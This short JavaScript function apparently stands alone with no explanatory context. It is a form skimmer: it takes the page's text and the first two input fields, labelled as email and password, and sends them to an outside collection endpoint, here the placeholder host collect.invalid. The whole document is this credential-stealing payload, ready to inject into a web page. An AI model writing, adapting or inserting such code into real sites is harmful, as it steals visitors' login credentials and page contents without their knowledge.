(function () {
  const pageText = (document.body && document.body.innerText) || "";
  const fields = document.querySelectorAll("input");
  const email = fields[0] ? fields[0].value : "";
  const secret = fields[1] ? fields[1].value : "";
  fetch("https://collect.invalid/submit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({email: email, password: secret, page: pageText})
  });
})();
